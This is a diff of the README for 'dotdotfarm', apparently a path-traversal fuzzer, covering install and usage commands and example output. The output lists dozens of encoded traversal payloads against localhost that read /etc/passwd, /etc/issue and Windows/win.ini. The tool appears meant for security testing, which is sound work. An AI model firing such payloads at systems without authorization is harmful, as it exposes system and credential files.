@@ -12,7 +12,7 @@ Installation
 git clone https://github.com/treddis/dotdotfarm
 cd dotdotfarm
 pip install -r requirements.txt
-python setup.py
+python setup.py install
 ```
 
 How to use
@@ -21,75 +21,60 @@ Passing in GET parameters
 ----------------------
 Passing brute parameters via `?par=val` pairs:
 ```bash
-dotdotweb -o windows http://someserver.com:1280/newpath?testparameter=FUZZ&secondparameter=somevalue
+dotdotweb -o windows -fc 500 http://someserver.com:1280/newpath?testparameter=FUZZ&secondparameter=somevalue
 ```
 
 Passing via headers
 -------------------
 Passing brute parameters via `Origin: master=FUZZ` pairs:
 ```bash
-dotdotweb -o linux -H "Referer: https://www.google.com/path?q=FUZZ" http://someserver.com:1280/newpath?testparameter=firstvalue&secondparameter=somevalue
+dotdotweb -o linux -fc 500,404 -H "Referer: https://www.google.com/path?q=FUZZ" http://someserver.com:1280/newpath?testparameter=firstvalue&secondparameter=somevalue
 ```
 
 Passing via POST data
 ---------------------
 Passing brute parameters via POST data parameters
 ```bash
-dotdotweb -o linux -H "key0=val0&key1=val1" http://someserver.com:1280/newpath?testparameter=firstvalue&secondparameter=somevalue
+dotdotweb -o linux -fc 500 -fs 111 -d "key0=val0&key1=val1" http://someserver.com:1280/newpath?testparameter=firstvalue&secondparameter=somevalue
 ```
 
 Example output
 ==============
 ```bash
 dotdotweb -o linux "http://localhost:8080/pathtrav?query=FUZZ" 
-[*] Started at Mon Jan 16 00:00:44 2023
-http://localhost:8080/pathtrav?query=..%2f..%2fetc%2fpasswd                                          [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=%2e./%2e./%2e./%2e./etc/passwd                                  [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/etc/passwd                                        [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2fetc%2fpasswd                                      [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2f%2e.%2f%2e.%2fetc%2fpasswd                        [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=%2e./%2e./%2e./etc/passwd                                       [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=../../../../etc/passwd                                          [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2f.%2e%2fetc%2fpasswd                               [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2f.%2e%2f.%2e%2fetc%2fpasswd                        [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=.%2e/.%2e/.%2e/etc/passwd                                       [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd                          [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/%2e%2e/etc/passwd                                 [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd                [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2fetc%2fpasswd                                  [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2fetc%2fpasswd                                      [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=../../etc/passwd                                                [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=..%2f..%2f..%2fetc%2fpasswd                                     [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=%2e./%2e./etc/passwd                                            [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=..%2f..%2f..%2f..%2fetc%2fpasswd                                [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=.%2e/.%2e/.%2e/.%2e/etc/passwd                                  [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=.%2e/.%2e/etc/passwd                                            [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2f%2e.%2fetc%2fpasswd                               [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=../../../etc/passwd                                             [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd                         [Status: 200, Size: 3831]
-http://localhost:8080/pathtrav?query=../../../etc/issue                                              [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=../../etc/issue                                                 [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=../../../../etc/issue                                           [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/%2e%2e/etc/issue                                  [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/issue                           [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=.%2e/.%2e/.%2e/.%2e/etc/issue                                   [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=.%2e/.%2e/etc/issue                                             [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=%2e./%2e./%2e./etc/issue                                        [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=%2e./%2e./etc/issue                                             [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=%2e./%2e./%2e./%2e./etc/issue                                   [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=.%2e/.%2e/.%2e/etc/issue                                        [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/etc/issue                                         [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=..%2f..%2f..%2fetc%2fissue                                      [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=..%2f..%2fetc%2fissue                                           [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=..%2f..%2f..%2f..%2fetc%2fissue                                 [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2fetc%2fissue                                       [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2f.%2e%2fetc%2fissue                                [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2f.%2e%2f.%2e%2fetc%2fissue                         [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2f%2e.%2fetc%2fissue                                [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2fetc%2fissue                                       [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2f%2e.%2f%2e.%2fetc%2fissue                         [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2fetc%2fissue                                   [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fissue                          [Status: 200, Size: 56]
-http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fissue                 [Status: 200, Size: 56]
-[*] Ended at Mon Jan 16 00:00:54 2023 (9 seconds)
+[*] Started at Sun Jan 22 19:32:46 2023
+ ../../../Windows/win.ini                                                                          [Status: 200, Size: 111]
+ ../Windows/win.ini                                                                                [Status: 200, Size: 111]
+ ..\Windows\win.ini                                                                                [Status: 200, Size: 111]
+ ..%2fWindows%2fwin.ini                                                                            [Status: 200, Size: 111]
+ ..\..\..\Windows\win.ini                                                                          [Status: 200, Size: 111]
+ ..%5c..%5c..%5cWindows%5cwin.ini                                                                  [Status: 200, Size: 111]
+ ..%5cWindows%5cwin.ini                                                                            [Status: 200, Size: 111]
+ .%2e/Windows/win.ini                                                                              [Status: 200, Size: 111]
+ .%2e\Windows\win.ini                                                                              [Status: 200, Size: 111]
+ .%2e%2fWindows%2fwin.ini                                                                          [Status: 200, Size: 111]
+ .%2e%5cWindows%5cwin.ini                                                                          [Status: 200, Size: 111]
+ %5C..%5cWindows%5cwin.ini                                                                         [Status: 200, Size: 111]
+ f%5C..%2fWindows%2fwin.ini                                                                        [Status: 200, Size: 111]
+ %5C../Windows/win.ini                                                                             [Status: 200, Size: 111]
+ %5C..\%5C..\%5C..\Windows\win.ini                                                                 [Status: 200, Size: 111]
+ .%2e\.%2e\.%2e\Windows\win.ini                                                                    [Status: 200, Size: 111]
+ .%2e%5c.%2e%5c.%2e%5cWindows%5cwin.ini                                                            [Status: 200, Size: 111]
+ %5C..%2f%5C..%2f%5C..%2fWindows%2fwin.ini                                                         [Status: 200, Size: 111]
+ %5C../%5C../%5C../Windows/win.ini                                                                 [Status: 200, Size: 111]
+ %5C..%5c%5C..%5c%5C..%5cWindows%5cwin.ini                                                         [Status: 200, Size: 111]
+ %2e./Windows/win.ini                                                                              [Status: 200, Size: 111]
+ %2e./%2e./%2e./Windows/win.ini                                                                    [Status: 200, Size: 111]
+ %2e.%5cWindows%5cwin.ini                                                                          [Status: 200, Size: 111]
+ %2e.%5c%2e.%5c%2e.%5cWindows%5cwin.ini                                                            [Status: 200, Size: 111]
+ .%2e%2f.%2e%2f.%2e%2fWindows%2fwin.ini                                                            [Status: 200, Size: 111]
+[*] Ended at Sun Jan 22 19:32:58 2023 (11 seconds)
 ```
+
+Limitations
+===========
+- Python 3.8+
+- High speed of requests rate can trigger WAF of you target
+- Unable to pass own dictionary for payload generator
+- No way to flexibly forge payloaded requests
+- Need of OS specifying
